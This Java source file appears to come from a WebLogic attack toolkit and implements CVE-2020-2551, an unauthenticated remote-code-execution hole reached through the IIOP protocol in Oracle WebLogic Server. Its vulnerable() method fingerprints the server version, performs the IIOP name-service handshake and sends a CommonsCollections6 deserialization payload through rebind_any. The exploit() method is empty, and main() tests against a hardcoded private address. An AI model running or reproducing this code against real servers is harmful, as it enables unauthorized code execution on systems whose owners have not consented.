package com.r4v3zn.weblogic.tools.payloads.impl;

import cn.hutool.core.util.HexUtil;
import com.r4v3zn.weblogic.tools.annotation.Authors;
import com.r4v3zn.weblogic.tools.payloads.ObjectPayload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

import static com.r4v3zn.weblogic.tools.utils.IIOPUtils.*;
import static com.r4v3zn.weblogic.tools.utils.SocketUtils.*;
import static com.r4v3zn.weblogic.tools.utils.VersionUtils.getVersion;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: CVE_2020_2551
 * Descrption:
 * <p>
 *     攻击者可以通过 IIOP 协议远程访问 Weblogic Server 服务器上的远程接口，传入恶意数据，从而获取服务器 权限并在未授权情况下远程执行任意代码。
 *     漏洞影响版本:
 *     Oracle WebLogic Server 10.3.6.0.0
 *     Oracle WebLogic Server 12.1.3.0.0
 *     Oracle WebLogic Server 12.2.1.3.0
 *     Oracle WebLogic Server 12.2.1.4.0
 *     github: https://github.com/0nise/CVE-2020-2551
 * </p>
 * Date:2020/3/23 23:05
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 * @author R4v3zn
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
public class CVE_2020_2551 implements ObjectPayload {

    /**
     * rebind any ok 响应内容
     */
    public static final String REBIND_ANY_OK = "47494f50010200010000000c000000040000000000000000";

    /**
     * 漏洞影响版本
     */
    public static final List<String> VUL_VERSIONS = new ArrayList<String>(){{
        add("10.3.6.0.0");
        add("12.1.3.0.0");
        add("12.2.1.3.0");
        add("12.2.1.4.0");
    }};

    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param ip ip
     * @param port 端口
     * @return 漏洞存在返回 true 否则返回 false
     */
    @Override
    public Boolean vulnerable(String ip, Integer port) throws Exception {
        // weblogic version
        String version = getVersion(ip, port);
        if(isBlank(version) || !VUL_VERSIONS.contains(version)){
            return false;
        }
        Socket socket = new Socket(ip, port);
        byte[] nameServiceByte = null;
        try{
            // op=nameService
            nameServiceByte = getNameService(socket);
        }catch (Exception e){
            return false;
        }
        // name service hex
        String nameServiceHex = binaryToHexString(nameServiceByte);
        // name service str
        String nameServiceStr = new String(nameServiceByte);
        // get key
        String key = getKey(nameServiceHex, true);
        if(isBlank(key)){
            return false;
        }
        // get nat host
        String natHost = "iiop://" + getNatHost(nameServiceStr);
        // op=_non_existent (get new Key)
        byte[] nonExistentByte = operationNonExistent(socket, key, natHost);
        String newKey = getKey(binaryToHexString(nonExistentByte),false);
        if(!isBlank(newKey)){
            key = newKey;
        }
        // op=_non_existent
        operationNonExistent(socket, key, natHost, false);
        // op =rebind_any
        String bindName = "1bGpOMicmx6DLLIB";
        // op=rebind_any
        byte[] rebindAnyByte = rebindAnyCommonsCollections6(socket, bindName, key);
        String rebindAnyHex = binaryToHexString(rebindAnyByte);
        if(!REBIND_ANY_OK.equals(rebindAnyHex)){
            return false;
        }
        // op=resolve_any
        byte[] resolveAnyByte = resolveAny(socket, key, bindName);
        String resolveAnyHex = binaryToHexString(resolveAnyByte);
        System.out.println(getKey(resolveAnyHex, false));
        return null;
    }

    /**
     * 漏洞利用
     * @param ip ip
     * @param port 端口
     * @throws Exception 抛出异常
     */
    @Override
    public void exploit(String ip, Integer port) throws Exception {

    }

    public static void main(String[] args) throws Exception {
        ObjectPayload payload = new CVE_2020_2551();
        String ip = "192.168.1.9";
        Socket socket = new Socket(ip, 7001);
        String key = "00424541080103000000000c41646d696e53657276657200000000000000003349444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e67436f6e74657874416e793a312e3000000000000238000000000000014245412c000000100000000000000000f76dc085a642e1f0";
        byte[] resolveAnyByte = resolveAny(socket, key, "HadVv2V3bF7lF1jp");
        String resolveAnyHex = binaryToHexString(resolveAnyByte);
        System.out.println(getKey(resolveAnyHex, true).length());
//        payload.vulnerable(ip, 7001);
    }
}
